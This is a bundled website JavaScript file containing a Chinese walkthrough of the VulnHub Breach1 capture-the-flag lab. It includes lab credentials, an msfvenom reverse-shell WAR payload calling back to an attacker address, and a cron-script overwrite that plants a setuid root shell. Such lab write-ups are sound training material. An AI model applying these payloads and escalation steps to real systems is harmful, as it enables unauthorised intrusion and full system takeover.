"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[4752],{28453:(r,e,n)=>{n.d(e,{R:()=>o,x:()=>c});var s=n(96540);const t={},a=s.createContext(t);function o(r){const e=s.useContext(a);return s.useMemo((function(){return"function"==typeof r?r(e):{...e,...r}}),[e,r])}function c(r){let e;return e=r.disableParentContext?"function"==typeof r.components?r.components(t):r.components||t:o(r.components),s.createElement(a.Provider,{value:e},r.children)}},51700:(r,e,n)=>{n.r(e),n.d(e,{assets:()=>i,contentTitle:()=>c,default:()=>d,frontMatter:()=>o,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"VulnHub/Virtual Machines/Breach1","title":"Breach1","description":"port scan","source":"@site/docs/VulnHub/Virtual Machines/Breach1.md","sourceDirName":"VulnHub/Virtual Machines","slug":"/VulnHub/Virtual Machines/Breach1","permalink":"/docs/VulnHub/Virtual Machines/Breach1","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/VulnHub/Virtual Machines/Breach1.md","tags":[],"version":"current","frontMatter":{},"sidebar":"VulnHubSidebar","previous":{"title":"Virtual Machines","permalink":"/docs/category/virtual-machines"},"next":{"title":"Breach2.1","permalink":"/docs/VulnHub/Virtual Machines/Breach2.1"}}');var t=n(74848),a=n(28453);const o={},c=void 0,i={},l=[{value:"port scan",id:"port-scan",level:2},{value:"web",id:"web",level:2},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2}];function h(r){const e={a:"a",blockquote:"blockquote",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",strong:"strong",...(0,a.R)(),...r.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.h2,{id:"port-scan",children:"port scan"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/Breach1]\r\n\u2514\u2500$ nmap 192.168.110.140 -p1-2000 | grep ^[0-9] | cut -d '/' -f 1 | wc -l\r\n2000\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u6709\u9632\u706b\u5899\u7b56\u7565\uff0c\u7aef\u53e3\u90fd\u662f\u5f00\u653e\u7684"}),"\n",(0,t.jsx)(e.p,{children:"\u5168\u7aef\u53e3\u5f00\u653e\uff0c\u53ea\u80fd\u624b\u52a8\u679a\u4e3e\u7aef\u53e3"}),"\n",(0,t.jsx)(e.h2,{id:"web",children:"web"}),"\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.code,{children:"80"}),"\u7aef\u53e3\uff0c\u67e5\u770b\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0base64\u7f16\u7801"]}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo"}),"\n"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sh",children:"echo 'Y0dkcFltSnZibk02WkdGdGJtbDBabVZsYkNSbmIyOWtkRzlpWldGbllXNW5KSFJo' | base64 -d | base64 -d\r\npgibbons:damnitfeel$goodtobeagang$ta\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u62ff\u5230\u4e00\u5bf9\u51ed\u636e"}),"\n",(0,t.jsx)(e.p,{children:"\u76ee\u5f55\u626b\u63cf"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sh",children:"dirb http://192.168.110.140             \r\n\r\n-----------------\r\nDIRB v2.22    \r\nBy The Dark Raver\r\n-----------------\r\n\r\nSTART_TIME: Sat Feb 15 02:19:56 2025\r\nURL_BASE: http://192.168.110.140/\r\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\r\n\r\n-----------------\r\n\r\nGENERATED WORDS: 4612                                                          \r\n\r\n---- Scanning URL: http://192.168.110.140/ ----\r\n==> DIRECTORY: http://192.168.110.140/images/                                                                                                                            \r\n+ http://192.168.110.140/index.html (CODE:200|SIZE:1098)                                                                                                                 \r\n+ http://192.168.110.140/server-status (CODE:403|SIZE:295)\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.a,{href:"http://192.168.110.140/images/bill.png",children:"http://192.168.110.140/images/bill.png"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215152152316.png",alt:"image-20250215152152316"})}),"\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.code,{children:"coffeestains"}),"\uff0c\u53ef\u80fd\u662f\u4e00\u4e2a\u5bc6\u7801"]}),"\n",(0,t.jsxs)(e.p,{children:["\u70b9\u51fb\u4e3b\u9875\u7684\u56fe\u7247\uff0c\u8df3\u8f6c\u5230",(0,t.jsx)(e.code,{children:"http://192.168.110.140/impresscms/user.php"})]}),"\n",(0,t.jsx)(e.p,{children:"\u62ff\u8fd9\u5bf9\u51ed\u636e\u5c1d\u8bd5\u767b\u5f55\uff0c\u767b\u5f55\u6210\u529f"}),"\n",(0,t.jsx)(e.p,{children:"\u67e5\u770b\u90ae\u7bb1"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"Posting sensitive content\r\n\u53d1\u5e03\u654f\u611f\u5185\u5bb9\r\n\r\nPeter, yeahhh, I'm going to have to go ahead and ask you to have your team only post any sensitive artifacts to the admin portal. My password is extremely secure. If you could go ahead and tell them all that'd be great. -Bill\r\n\u5f7c\u5f97\uff0c\u662f\u554a\uff0c\u6211\u5f97\u8bf7\u4f60\u8ba9\u4f60\u7684\u56e2\u961f\u53ea\u5728\u7ba1\u7406\u95e8\u6237\u4e0a\u53d1\u5e03\u654f\u611f\u4fe1\u606f\u3002\u6211\u7684\u5bc6\u7801\u975e\u5e38\u5b89\u5168\u3002\u5982\u679c\u4f60\u80fd\u544a\u8bc9\u4ed6\u4eec\uff0c\u90a3\u5c31\u592a\u597d\u4e86\u3002-\u6bd4\u5c14\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"IDS/IPS system  IDS/IPS \u7cfb\u7edf\r\n\r\nHey Peter,  \u563f\uff0c\u5f7c\u5f97\r\n\r\nI got a really good deal on an IDS/IPS system from a vendor I met at that happy hour at Chotchkie's last week!\r\n\u4e0a\u5468\u5728 Chotchkie's \u7684\u6b22\u4e50\u65f6\u5149\u91cc\uff0c\u6211\u4ece\u4e00\u4e2a\u4f9b\u5e94\u5546\u90a3\u91cc\u4e70\u5230\u4e86\u4e00\u5957\u975e\u5e38\u5212\u7b97\u7684 IDS/IPS \u7cfb\u7edf\uff01\r\n\r\n-Michael  -\u8fc8\u514b\u5c14\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"FWD: Thank you for your purchase of Super Secret Cert Pro!\r\nFWD\uff1a\u611f\u8c22\u60a8\u8d2d\u4e70\u8d85\u7ea7\u79d8\u5bc6\u8bc1\u4e66\u4e13\u4e1a\u7248\uff01\r\n\r\nPeter, I am not sure what this is. I saved the file here: 192.168.110.140/.keystore Bob ------------------------------------------------------------------------------------------------------------------------------------------- From: registrar@penetrode.com Sent: 02 June 2016 16:16 To: bob@initech.com; admin@breach.local Subject: Thank you for your purchase of Super Secret Cert Pro! Please find attached your new SSL certificate. Do not share this with anyone!\r\n\u5f7c\u5f97\uff0c\u6211\u4e0d\u786e\u5b9a\u8fd9\u662f\u4ec0\u4e48\u3002\u6211\u5c06\u6587\u4ef6\u4fdd\u5b58\u5728\u8fd9\u91cc\uff1a192.168.110.140/.keystore Bob ------------------------------------------------------------------------------------------------------------------------------------------- From: registrar@penetrode.com Sent: 02 June 2016 16:16 To: bob@initech.com; admin@breach.local Subject\uff1a\u611f\u8c22\u60a8\u8d2d\u4e70 Super Secret Cert Pro\uff01\u968f\u51fd\u9644\u4e0a\u60a8\u7684\u65b0 SSL \u8bc1\u4e66\u3002\u8bf7\u52ff\u4e0e\u4efb\u4f55\u4eba\u5171\u4eab\uff01\n"})}),"\n",(0,t.jsxs)(e.p,{children:[(0,t.jsx)(e.code,{children:"192.168.110.140/.keystore"}),"\u4e0b\u8f7d"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sh",children:"file keystore     \r\nkeystore: Java KeyStore\n"})}),"\n",(0,t.jsx)(e.p,{children:"Java KeyStore\uff08JKS\uff09\u662f\u5b89\u5168\u8bc1\u4e66\uff08\u6388\u6743\u8bc1\u4e66\u6216\u516c\u94a5\u8bc1\u4e66\uff09\u4ee5\u53ca\u76f8\u5e94\u79c1\u94a5\u7684\u5b58\u50a8\u5e93\uff0c\u7528\u4e8e TLS \u52a0\u5bc6\u7b49"}),"\n",(0,t.jsxs)(e.p,{children:["\u53c2\u8003\uff1a",(0,t.jsx)(e.a,{href:"https://blog.csdn.net/weixin_40763897/article/details/135424393",children:"https://blog.csdn.net/weixin_40763897/article/details/135424393"})]}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.a,{href:"https://en.wikipedia.org/wiki/Java_KeyStore",children:"https://en.wikipedia.org/wiki/Java_KeyStore"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"\u67e5\u770b.keystore\u6587\u4ef6\u4fe1\u606f"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sh",children:"keytool -list -v -keystore keystore\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u9700\u8981\u8f93\u5165\u5bc6\u7801"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.a,{href:"http://192.168.110.140/impresscms/modules/profile/index.php?uid=2",children:"http://192.168.110.140/impresscms/modules/profile/index.php?uid=2"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215153518530.png",alt:"image-20250215153518530"})}),"\n",(0,t.jsx)(e.p,{children:"\u627e\u5230\u4ee5\u4e0b\u5185\u5bb9\uff1a"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215153607140.png",alt:"image-20250215153607140"})}),"\n",(0,t.jsxs)(e.p,{children:["\u5bc6\u7801\u662f",(0,t.jsx)(e.code,{children:"tomcat"})]}),"\n",(0,t.jsx)(e.p,{children:"\u5c06Keystore\u8f6cP12\u7c7b\u578b"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sh",children:"keytool -importkeystore -srckeystore keystore -destkeystore keystore.p12 -deststoretype pkcs12\r\nImporting keystore keystore to keystore.p12...\r\nEnter destination keystore password:  \r\nRe-enter new password: \r\nEnter source keystore password:  \r\nEntry for alias tomcat successfully imported.\r\nImport command completed:  1 entries successfully imported, 0 entries failed or cancelled\r\n\r\n\u250c\u2500\u2500(kali\u327fkali)-[~/vulnhub/Breach1]\r\n\u2514\u2500$ file keystore.p12 \r\nkeystore.p12: data\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u4e0b\u8f7d\u4e86\u8fd9\u4e2a\u6d41\u91cf\u5305"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.a,{href:"http://192.168.110.140/impresscms/_SSL_test_phase1.pcap",children:"http://192.168.110.140/impresscms/_SSL_test_phase1.pcap"})}),"\n",(0,t.jsx)(e.p,{children:"TLS\u534f\u8bae\u52a0\u5bc6\uff0c\u9700\u8981\u5bfc\u5165\u5bc6\u94a5\u89e3\u5bc6"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215154128168.png",alt:"image-20250215154128168"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215154325690.png",alt:"image-20250215154325690"})}),"\n",(0,t.jsx)(e.p,{children:"\u89e3\u5bc6\u6210\u529f"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20250215154406222.png",alt:"image-20250215154406222"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.code,{children:"tomcat:Tt\\5D8F(#!*u=G)4m7zB"})}),"\n",(0,t.jsx)(e.p,{children:"\u767b\u5f55\u5230tomcat\u540e\u53f0"}),"\n",(0,t.jsx)(e.p,{children:"war\u5305\u90e8\u7f72"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.110.7 LPORT=1234 -f war > shell.war\n"})}),"\n",(0,t.jsx)(e.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,t.jsx)(e.p,{children:"\u6536\u96c6tomcat\u4fe1\u606f"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sh",children:'tomcat6@Breach:/var/lib/tomcat6/conf$ cat tomcat-users.xml\r\n<?xml version=\'1.0\' encoding=\'utf-8\'?>\r\n......\r\n\x3c!--\r\n  <role rolename="tomcat"/>\r\n  <role rolename="role1"/>\r\n  <user username="tomcat" password="tomcat" roles="tomcat"/>\r\n  <user username="both" password="tomcat" roles="tomcat,role1"/>\r\n  <user username="role1" password="tomcat" roles="role1"/>\r\n\r\n--\x3e\r\n\r\n<role rolename="manager"/>\r\n<user username="tomcat" password="Tt\\5D8F(#!*u=G)4m7zB" roles="manager"/>\r\n\r\n</tomcat-users>\n'})}),"\n",(0,t.jsx)(e.p,{children:"\u53d1\u73b0mysql\u662f\u7a7a\u5bc6\u7801"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sh",children:"tomcat6@Breach:/var/www/5446$ cat fe4db1f7bc038d60776dcb66ab3404d5.php\r\n<?php\r\n\r\n// Database Hostname\r\n// Hostname of the database server. If you are unsure, 'localhost' works in most cases.\r\ndefine( 'SDATA_DB_HOST', 'localhost' );\r\n\r\n// Database Username\r\n// Your database user account on the host\r\ndefine( 'SDATA_DB_USER', 'root' );\r\n\r\n// Database Password\r\n// Password for your database user account\r\ndefine( 'SDATA_DB_PASS', '' );\r\n\r\n// Database Name\r\n// The name of database on the host. The installer will attempt to create the database if not exist\r\ndefine( 'SDATA_DB_NAME', 'impresscms' );\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u67e5\u770bmysql\u6570\u636e\u5e93\u7684\u7528\u6237"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-mysql",children:"mysql> select User,Password from user;\r\nselect User,Password from user;\r\n+------------------+-------------------------------------------+\r\n| User             | Password                                  |\r\n+------------------+-------------------------------------------+\r\n| root             |                                           |\r\n| milton           | 6450d89bd3aff1d893b85d3ad65d2ec2          |\r\n| root             |                                           |\r\n| root             |                                           |\r\n| debian-sys-maint | *A9523939F1B2F3E72A4306C34F225ACF09590878 |\r\n+------------------+-------------------------------------------+\r\n5 rows in set (0.00 sec)\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u7206\u7834hash"}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsx)(e.p,{children:"6450d89bd3aff1d893b85d3ad65d2ec2 \u89e3\u5bc6\u4e3a\uff1athelaststraw"}),"\n"]}),"\n",(0,t.jsxs)(e.p,{children:["\u5207\u6362\u5230",(0,t.jsx)(e.code,{children:"milton"}),"\u7528\u6237"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sh",children:"milton@Breach:~$ id\r\nuid=1000(milton) gid=1000(milton) groups=1000(milton),4(adm),24(cdrom),30(dip),46(plugdev),110(lpadmin),111(sambashare)\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u8fd9\u662f",(0,t.jsx)(e.code,{children:"adm"}),"\u7ec4\uff0c\u67e5\u627eadm\u6743\u9650\u7684\u6587\u4ef6"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"find / -group adm 2>/dev/null\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u53d1\u73b0",(0,t.jsx)(e.code,{children:"/var/log/syslog"}),"\u6587\u4ef6"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sh",children:"cat /var/log/syslog\r\nJun  7 06:10:01 Breach CRON[4901]: (root) CMD (/usr/share/cleanup/tidyup.sh)\r\nJun  7 06:12:01 Breach CRON[4907]: (root) CMD (/usr/share/cleanup/tidyup.sh)\r\nJun  7 06:14:01 Breach CRON[4913]: (root) CMD (/usr/share/cleanup/tidyup.sh)\r\nJun  7 06:16:01 Breach CRON[4919]: (root) CMD (/usr/share/cleanup/tidyup.sh)\r\nJun  7 06:17:01 Breach CRON[4925]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)\r\nJun  7 06:17:55 Breach dhclient: DHCPREQUEST of 192.168.110.140 on eth0 to 192.168.110.254 port 67 (xid=0x96b1298)\r\nJun  7 06:17:55 Breach dhclient: DHCPACK of 192.168.110.140 from 192.168.110.254\r\nJun  7 06:17:55 Breach dhclient: bound to 192.168.110.140 -- renewal in 857 seconds.\r\nJun  7 06:18:02 Breach CRON[4938]: (root) CMD (/usr/share/cleanup/tidyup.sh)\r\nJun  7 06:20:01 Breach CRON[4944]: (root) CMD (/usr/share/cleanup/tidyup.sh)\r\nJun  7 06:22:01 Breach CRON[4950]: (root) CMD (/usr/share/cleanup/tidyup.sh)\r\nJun  7 06:24:01 Breach CRON[4956]: (root) CMD (/usr/share/cleanup/tidyup.sh)\r\nJun  7 06:25:01 Breach CRON[4962]: (root) CMD (test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ))\r\nJun  7 06:26:01 Breach CRON[5006]: (root) CMD (/usr/share/cleanup/tidyup.sh)\r\nJun  7 06:28:01 Breach CRON[5012]: (root) CMD (/usr/share/cleanup/tidyup.sh)\r\nJun  7 06:30:01 Breach CRON[5018]: (root) CMD (/usr/share/cleanup/tidyup.sh)\r\nJun  7 06:32:01 Breach CRON[5024]: (root) CMD (/usr/share/cleanup/tidyup.sh)\r\nJun  7 06:32:12 Breach dhclient: DHCPREQUEST of 192.168.110.140 on eth0 to 192.168.110.254 port 67 (xid=0x96b1298)\r\nJun  7 06:32:12 Breach dhclient: DHCPACK of 192.168.110.140 from 192.168.110.254\r\nJun  7 06:32:12 Breach dhclient: bound to 192.168.110.140 -- renewal in 897 seconds.\r\nJun  7 06:34:01 Breach CRON[5040]: (root) CMD (/usr/share/cleanup/tidyup.sh)\r\nJun  7 06:36:01 Breach CRON[5046]: (root) CMD (/usr/share/cleanup/tidyup.sh)\r\nJun  7 06:38:01 Breach CRON[5052]: (root) CMD (/usr/share/cleanup/tidyup.sh)\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u89c2\u5bdf\u53d1\u73b0",(0,t.jsx)(e.code,{children:"/usr/share/cleanup/tidyup.sh"}),"\u662f\u4ee5root\u7528\u6237\u6267\u884c\u7684\uff08\u6bcf\u4e09\u5206\u949f\u6267\u884c\uff09"]}),"\n",(0,t.jsx)(e.p,{children:"\u4f46\u662f\u6ca1\u6743\u9650\u7f16\u8f91"}),"\n",(0,t.jsxs)(e.p,{children:["\u5207\u6362\u5230",(0,t.jsx)(e.code,{children:"blumbergh"}),"\u7528\u6237\uff0c\u5bc6\u7801\u662f\uff1acoffeestains"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sh",children:"milton@Breach:~$ su - blumbergh\r\nPassword: coffeestains\r\n\r\nblumbergh@Breach:~$ sudo -l\r\nMatching Defaults entries for blumbergh on Breach:\r\n    env_reset, mail_badpass,\r\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\r\n\r\nUser blumbergh may run the following commands on Breach:\r\n    (root) NOPASSWD: /usr/bin/tee /usr/share/cleanup/tidyup.sh\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u53ef\u4ee5\u4f7f\u7528",(0,t.jsx)(e.code,{children:"tee"}),"\u5199\u6587\u4ef6"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sh",children:"blumbergh@Breach:~$ cat 1.sh\r\n#!/bin/bash\r\ncp /bin/bash /tmp/bash\r\nchmod +s /tmp/bash\r\nblumbergh@Breach:~$ cat 1.sh | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh\r\n#!/bin/bash\r\ncp /bin/bash /tmp/bash\r\nchmod +s /tmp/bash\r\nblumbergh@Breach:~$ cat /usr/share/cleanup/tidyup.sh\r\n#!/bin/bash\r\ncp /bin/bash /tmp/bash\r\nchmod +s /tmp/bash\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sh",children:"blumbergh@Breach:/tmp$ ./bash -p\r\nbash-4.3# id\r\nuid=1001(blumbergh) gid=1001(blumbergh) euid=0(root) egid=0(root) groups=0(root),1001(blumbergh)\r\nbash-4.3# cd /root\r\nbash-4.3# ls -la\r\ntotal 60\r\ndrwx------  4 root root  4096 Jun 12  2016 .\r\ndrwxr-xr-x 22 root root  4096 Jun  4  2016 ..\r\n-rw-------  1 root root   115 Jun 12  2016 .bash_history\r\n-rw-r--r--  1 root root  3106 Feb 19  2014 .bashrc\r\ndrwx------  2 root root  4096 Jun  6  2016 .cache\r\n-rw-r--r--  1 root root   840 Jun 11  2016 .flag.txt\r\n-rw-r--r--  1 root root 23792 Jun  4  2016 flair.jpg\r\n-rw-r--r--  1 root root   140 Feb 19  2014 .profile\r\ndrwxr-xr-x  2 root root  4096 Jun  5  2016 .rpmdb\r\n-rw-r--r--  1 root root    66 Jun  4  2016 .selected_editor\r\nbash-4.3# cat .flag.txt\r\n-----------------------------------------------------------------------------------\r\n\r\n______                     _     __   _____      _____ _          _____          _ \r\n| ___ \\                   | |   /  | |  _  |    |_   _| |        |  ___|        | |\r\n| |_/ /_ __ ___  __ _  ___| |__ `| | | |/' |______| | | |__   ___| |__ _ __   __| |\r\n| ___ \\ '__/ _ \\/ _` |/ __| '_ \\ | | |  /| |______| | | '_ \\ / _ \\  __| '_ \\ / _` |\r\n| |_/ / | |  __/ (_| | (__| | | || |_\\ |_/ /      | | | | | |  __/ |__| | | | (_| |\r\n\\____/|_|  \\___|\\__,_|\\___|_| |_\\___(_)___/       \\_/ |_| |_|\\___\\____/_| |_|\\__,_|\r\n\r\n\r\n-----------------------------------------------------------------------------------\r\nCongrats on reaching the end and thanks for trying out my first #vulnhub boot2root!\r\n\r\nShout-out to knightmare, and rastamouse for testing and g0tmi1k for hosting.\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u7528",(0,t.jsx)(e.code,{children:"linpeas.sh"}),"\u679a\u4e3e\u53d1\u73b0\uff0c/etc/init.d/portly.sh\u53ef\u5199"]}),"\n",(0,t.jsx)(e.p,{children:"\u673a\u5668\u5c06\u5728\u542f\u52a8\u8fc7\u7a0b\u4e2d\u6267\u884c /etc/init.d\u4e2d\u7684\u6240\u6709\u5185\u5bb9"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sh",children:"bash-4.3# ls -l /etc/init.d/portly.sh\r\n-rwxrwxrwx 1 root root 231 Jun  5  2016 /etc/init.d/portly.sh\r\nbash-4.3# cat /etc/init.d/portly.sh\r\n#!/bin/bash\r\n\r\niptables -t nat -A PREROUTING -p tcp --match multiport --dport 1:79,81:8442,8444:65535 -j REDIRECT --to-ports 4444 && /usr/local/bin/portspoof -c /usr/local/etc/portspoof.conf -s /usr/local/etc/portspoof_signatures -D\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u540c\u6837\uff0c\u5199\u5165portly.sh\uff0c\u9700\u8981\u91cd\u542f\u673a\u5668"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-sh",children:"iptables -t nat -A PREROUTING -p tcp --match multiport --dport 1:79,81:8442,8444:65535 -j REDIRECT --to-ports 4444 && /usr/local/bin/portspoof -c /usr/local/etc/portspoof.conf -s /usr/local/etc/portspoof_signatures -D\n"})}),"\n",(0,t.jsxs)(e.blockquote,{children:["\n",(0,t.jsxs)(e.p,{children:["\u901a\u8fc7 ",(0,t.jsx)(e.code,{children:"iptables"})," \u5c06\u6307\u5b9a\u7684 TCP \u6d41\u91cf\u91cd\u5b9a\u5411\u5230\u672c\u673a\u7684 4444 \u7aef\u53e3\uff0c\u5141\u8bb8\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u63a5\u6536\u8fd9\u4e9b\u6d41\u91cf"]}),"\n",(0,t.jsxs)(e.p,{children:["\u540c\u65f6\uff0c\u4f7f\u7528 ",(0,t.jsx)(e.code,{children:"portspoof"})," \u4f2a\u88c5\u5f00\u653e\u7684\u7aef\u53e3\uff0c\u63d0\u9ad8\u7cfb\u7edf\u7684\u5b89\u5168\u6027\uff0c\u9632\u6b62\u653b\u51fb\u8005\u901a\u8fc7\u7aef\u53e3\u626b\u63cf\u53d1\u73b0\u771f\u5b9e\u7684\u670d\u52a1"]}),"\n"]})]})}function d(r={}){const{wrapper:e}={...(0,a.R)(),...r.components};return e?(0,t.jsx)(e,{...r,children:(0,t.jsx)(h,{...r})}):h(r)}}}]);